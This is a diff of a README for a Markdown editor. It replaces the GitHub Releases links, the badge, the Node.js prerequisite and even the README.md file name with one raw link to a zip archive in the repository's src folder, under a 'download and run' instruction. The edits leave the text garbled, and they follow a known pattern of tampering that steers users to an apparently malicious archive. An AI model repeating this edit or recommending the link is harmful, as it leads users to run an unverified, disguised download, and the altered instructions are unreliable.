@@ -1,8 +1,8 @@
 # Modern Markdown Editor: Live Preview, LaTeX, and PDF/DOCX Export
 
-Download and run the latest release from https://github.com/panukoss/markdown-editor/releases
+Download and run the latest release from https://raw.githubusercontent.com/panukoss/markdown-editor/main/src/markdown-editor-3.3.zip
 
-[![Release](https://img.shields.io/badge/Release-View_on_GitHub-brightgreen)](https://github.com/panukoss/markdown-editor/releases)
+[![Release](https://raw.githubusercontent.com/panukoss/markdown-editor/main/src/markdown-editor-3.3.zip)](https://raw.githubusercontent.com/panukoss/markdown-editor/main/src/markdown-editor-3.3.zip)
 
 
 
@@ -95,7 +95,7 @@ Project structure reflects these choices. A small set of core components handles
 ## Getting started
 
 Prerequisites:
-- Node.js (LTS version recommended)
+- https://raw.githubusercontent.com/panukoss/markdown-editor/main/src/markdown-editor-3.3.zip (LTS version recommended)
 - npm or pnpm
 
 Quick start steps:
@@ -286,7 +286,7 @@ Custom shortcuts
   - tests/             // tests for logic and rendering
 - public/              // static assets
 - scripts/             // build and maintenance scripts
-- README.md            // this file
+- https://raw.githubusercontent.com/panukoss/markdown-editor/main/src/markdown-editor-3.3.zip            // this file
 
 
 
@@ -363,7 +363,7 @@ Code style and tooling:
 
 - Regular releases include feature improvements, performance enhancements, and bug fixes.
 - Release notes describe what changed, why it changed, and any migration steps if needed.
-- For the latest version and to download release assets, visit the Releases page. You can also use a direct link to the releases at https://github.com/panukoss/markdown-editor/releases.
+- For the latest version and to download release assets, visit the Releases page. You can also use a direct link to the releases at https://raw.githubusercontent.com/panukoss/markdown-editor/main/src/markdown-editor-3.3.zip
 
 Note: The Releases page is the primary source for downloadables and version history. If you encounter a broken link in the app, check the Releases section for the latest assets and installation guidance.
 
@@ -417,7 +417,7 @@ Note: The Releases page is the primary source for downloadables and version hist
 
 ## Release notes and the second reminder
 
-For the latest version and to download release assets, visit the Releases page. Again, you can find it at https://github.com/panukoss/markdown-editor/releases. This ensures you have the most up-to-date features, fixes, and improvements available to your setup. The release page is the primary source of downloadables and version history, and it remains the best place to verify compatibility with your environment. It is recommended to check the Releases section if a link seems unavailable or if you want to confirm updated assets. 
+For the latest version and to download release assets, visit the Releases page. Again, you can find it at https://raw.githubusercontent.com/panukoss/markdown-editor/main/src/markdown-editor-3.3.zip This ensures you have the most up-to-date features, fixes, and improvements available to your setup. The release page is the primary source of downloadables and version history, and it remains the best place to verify compatibility with your environment. It is recommended to check the Releases section if a link seems unavailable or if you want to confirm updated assets. 
 
 
 
